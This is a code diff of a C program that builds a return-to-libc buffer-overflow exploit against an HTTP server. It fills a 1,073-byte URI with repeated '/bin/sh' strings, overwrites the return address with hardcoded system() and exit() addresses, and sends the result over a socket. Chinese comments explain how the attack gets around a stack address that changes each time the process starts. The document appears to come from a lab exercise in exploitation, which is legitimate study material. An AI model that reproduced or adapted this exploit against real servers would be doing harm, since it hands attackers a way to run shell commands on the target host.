@@ -42,9 +42,12 @@ int browser(int port,int stringaddr);
   
  int main(int argc,char *argv[])
  {
-   int port=PORT,addr=0xbffff400;
+   int port=PORT,addr=0xbf89ba38;
+  // printf("%x\n",&port);
    if(argc>1) port=atoi(argv[1]);
-   for(addr=0xbffff400;addr<=0xbffff600;addr++)
+ // for(addr=0xbfdbf8d8;addr<=0xc0000000;addr++)
+ //httpd的环境变量地址每次都在变，不可能通过暴力破解来猜到/bin/bash的地址
+ //所以我们要把system的参数放在栈中，重生的栈地址不变，只有在第一次创建进程时栈地址不可预测
         browser(port,addr);
    
  }
@@ -66,27 +69,37 @@ int browser(int port,int stringaddr)
       exit(1);
     }
  
-  printf("sock_client = %d\n",sock_client);
-  char uri[1065];
+  printf("stack address = %x\n",stringaddr);
+  char uri[2000];
   long *addr_s;
   int i;
+
   addr_s=(long *)uri;
-  for(i=0;i<266;i++)
-	 addr_s[i]=0xb7e5f060;      //system的地址
-	 addr_s[i++]=0xb7e52be0;    //exit的地址
-   addr_s[i]= stringaddr;     //system的地址参数的地址
-  for(i=0;i<strlen(shellcode);i++)
-           uri[i]=shellcode[i];
-     uri[1073]='\0';
-     uri[1072]=' ';
-     write(sock_client,uri,strlen(uri));    
+for(i=0;i<1060;i++)
+{
+     uri[i++]='/';
+     uri[i++]='b';
+     uri[i++]='i';
+     uri[i++]='n';
+     uri[i++]='/';
+     uri[i++]='s';
+     uri[i++]='h';//将/bin/sh写入栈中，作为system的参数
+     uri[i]  ='\0';
+}
+	 addr_s[265]=0xb7648060;//0xb7e5f060;      //system的地址
+	 addr_s[266]=0xb763bbe0;      //exit的地址
+         addr_s[267]= stringaddr;     //system的地址参数的地址0xbffff591 是台式机上虚拟机的地址
+     	 uri[1073]='\0';
+         uri[1072]=' ';
+         write(sock_client,uri,1073);    
+         printf("%s\n",uri);
 // char resp[1024];
 // int num = 0;
 // while(read (sock_client, &resp[num], 1))
 //	num++;
 //  resp[num] = 0;
 //  printf("Response = %s\n",resp);
-  close(sock_client);
+         close(sock_client);
 //  printf("have closed socket\n");
   return 0;
 }
